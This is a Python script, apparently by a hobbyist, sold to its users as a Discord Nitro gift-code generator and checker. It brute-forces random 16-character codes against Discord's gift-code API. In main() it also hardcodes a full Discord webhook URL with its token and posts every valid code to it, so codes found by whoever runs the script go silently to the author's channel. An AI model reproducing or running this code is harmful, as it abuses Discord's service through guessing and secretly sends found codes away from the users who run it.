# HEY MY CUTE LITTLE SKIDS, PLEASE DONT STEAL D: 
## I WORKED REALLY HARD ON THIS AND IT WOULD SUCK IF MY EXE GOT DECOMPILED AND STOLEN 
### THIS ISN'T HORRIBLY HARD TO MAKE AND IM JUST A NOVICE, IF U WANT TO DECOMPILE AND THEN OPTIMIZE IT BCS
#### IDK HOW TO MULTITHREAD ON PYTHON THEN PLS GO AHEAD JUST LMK 
##### SO ALL OF THE CREDITS WILL BE DONE WITH MY DISCORD ID, IF YOU GO TO A DISCORD ID LOOKUP YOU CAN FIND AND ADD ME
###### THE REASON I DO THAT IS SO I CAN BE ADDED IF I EVER CHANGE MY DISCORD USER. 
####### HAVE A NICE DAY AND PLEASE DONT STEAL :D 
import os
import random
import string
import time
import ctypes

try: # check requirements
    from discord_webhook import DiscordWebhook # try import discord_webhook
except ImportError: # if cant be installed
    input(f"discord_webhook not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install discord_webhook'\nPress enter to exit") # Tell the user it has not been installed and how to install it
    exit() # exit
try: # setup try to import requests
    import requests # try
except ImportError: # if not installed
    input(f"requests not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install requests'\nPress enter to exit")# Tell the user it has not been installed and how to install it
    exit() # exit


class NitroGen: # initialize class
    def __init__(self): # funct for initialization
        self.fileName = "kittens nitro codes.txt" # file for code storage

    def main(self): # main function (muy importante)
        os.system('cls' if os.name == 'nt' else 'clear') # clear screen
        if os.name == "nt": # if windows os
            print("")
            ctypes.windll.kernel32.SetConsoleTitleW("Nitro Generator and Checker - Made by Sawyer :D") # win title update
        else: # unix title update
            print(f'\33]0;Nitro Generator and Checker - Made by Sawyer :D\a', end='', flush=True) # update title of cmd prompt

        print("""  _   _  _____  _______  _____    ____  
 | \ | ||_   _||__   __||  __ \  / __ \ 
 |  \| |  | |     | |   | |__) || |  | |
 | . ` |  | |     | |   |  _  / | |  | |
 | |\  | _| |_    | |   | | \ \ | |__| |
 |_| \_||_____|   |_|   |_|  \_\ \____/ 
                                        
                                        """) # title card
        time.sleep(2) # wait for 2 secs
        self.slowType("Made by: 774816976756539422", .02) # CREDITS PLS NO TAKEY
        time.sleep(1) # wait 1 sec
        self.slowType("\nHow many Nitro codes do you want to check?: ", .02, newLine = False) # first question

        num = int(input('')) # code amounts input

        
        url = 'https://discord.com/api/webhooks/1009646128398073866/Muo2SP-5jUWTqPT2tLSZVPRehMekcvltxeucq-VSi8F-H0FGCYhje9L48vNWWQEZNuuI' # Get the awnser
        webhook = url if url != "" else None # if the url malfunctions or is empty it will just void it and run without one

        valid = [] # valid code tracker
        invalid = 0 # invalid code tracker

        for i in range(num): # loop the amount of codes
            try: # error catcher !!
                code = "".join(random.choices( # gift id generation
                    string.ascii_uppercase + string.digits + string.ascii_lowercase,
                    k = 16
                ))
                url = f"https://discord.gift/{code}" # url generation

                result = self.quickChecker(url, webhook) # code checker

                if result: # if valid
                    valid.append(url) # add to text file
                else: # if invalid
                    invalid += 1 # increase invalid count by 1
            except Exception as e: # if request fails
                print(f" Error | {url} ") # tell user error occured

            if os.name == "nt": # if in windows
                ctypes.windll.kernel32.SetConsoleTitleW(f"Nitro Generator and Checker - {len(valid)} Valid | {invalid} Invalid - Made by Sawyer :D") # change the title
                print("")
            else: # if on unix
                print(f'\33]0;Nitro Generator and Checker - {len(valid)} Valid | {invalid} Invalid - Made by Sawyer :D\a', end='', flush=True) # change the title

        print(f"""
Results:
 Valid: {len(valid)}
 Invalid: {invalid}
 Valid Codes: {', '.join(valid )}""") # report of checks

        input("\nAll done! Press Enter 5 times to close the this.") # inform user checking is finished
        [input(i) for i in range(4,0,-1)] # 4 enter presses


    def slowType(self, text, speed, newLine = True): # fancy text
        for i in text: # loop messages
            print(i, end = "", flush = True) # print a singular character (use flush to force python)
            time.sleep(speed) # sleep for a small amount of time
        if newLine: # check if newline is true
            print() # print a final newline to make it appear more natural

    def generator(self, amount): # function for generating the file of nitro codes
        with open(self.fileName, "w", encoding="utf-8") as file: # loads file into write mode
            print("Generating...") # let the user know codes are being generated

            start = time.time() # note initialization time

            for i in range(amount): # loop amt of codes to gen
                code = "".join(random.choices(
                    string.ascii_uppercase + string.digits + string.ascii_lowercase,
                    k = 16
                )) # gen CID

                file.write(f"https://discord.gift/{code}\n") # write code

            # tell the user it has finished generating and tell the user how long it took
            print(f"Genned {amount} codes | Time taken: {round(time.time() - start, 5)}s\n")

    def fileChecker(self, notify = None): # function to check nitro codes from file
        valid = [] # list of valid codes
        invalid = 0 # amount of invalid codes detected
        with open(self.fileName, "r", encoding="utf-8") as file: # open file containing nitro codes
            for line in file.readlines(): # loop over each line in the file
                nitro = line.strip("\n") # remove the newLine at the end of each valid code

                # requests url
                url = f"https://discordapp.com/api/v6/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"

                response = requests.get(url) # get response from url

                if response.status_code == 200: # if response went through
                    print(f" Valid | {nitro} ") # tell user code was valid
                    valid.append(nitro) # append valid code to list

                    if notify is not None: # if webhook valid
                        DiscordWebhook( # send a message that nitro was found
                            url = notify,
                            content = f"<:Nitro:942735110090919956> Valid Nito Code detected! <:Nitro:942735110090919956> ||@everyone|| \n{nitro}"
                        ).execute()
                    else: # if webhook not valid then stop code
                        break # stop loop since valid code was found

                else: # if the response was ignored (404 or 405)
                    print(f" Invalid | {nitro} ") # tell user it was invalid
                    invalid += 1 # increase invalid cnt by 1

        return {"valid" : valid, "invalid" : invalid} # return overall report of results

    def quickChecker(self, nitro, notify = None): # check codes in order (1 at a time)
        # generate request url
        url = f"https://discordapp.com/api/v6/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"
        response = requests.get(url) # get response

        if response.status_code == 200: # if response went through
            print(f" Valid | {nitro} ", flush=True, end="" if os.name == 'nt' else "\n") # inform user that the CID was valid
            with open("kittens nitro codes.txt", "w") as file: # open file to write
                file.write(nitro) # write nitro code to file (will auto add newLine)

            if notify is not None: # if webhook added
                DiscordWebhook( # send discord message that nitro code was valid
                    url = notify,
                    content = f"<:Nitro:942735110090919956> Valid Nito Code detected! <:Nitro:942735110090919956> ||@everyone|| \n{nitro}"
                ).execute()

            return True # tell main funct code was found

        else: # if the response was ignored (404 or 405)
            print(f" Invalid | {nitro} ", flush=True, end="" if os.name == 'nt' else "\n") # tell user it was invalid
            return False # inform main function no valid code found

if __name__ == '__main__':
    Gen = NitroGen() # create main generator object
    Gen.main() # run main code
